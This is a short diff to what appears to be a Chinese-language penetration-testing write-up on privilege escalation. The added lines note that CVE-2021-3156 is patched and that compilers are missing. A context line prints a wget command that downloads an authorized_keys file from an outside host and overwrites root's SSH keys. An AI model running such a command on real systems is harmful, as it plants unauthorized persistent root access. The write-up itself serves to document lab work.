@@ -149,6 +149,8 @@ wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles
 
 但是缺少比如`make`,`cc`,`cc1`等条件,无法编译(手动上传也不行...)
 
+`CVE-2021-3156`已经patched
+
 除了直接提权外,还有邮件可能可以利用
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png)
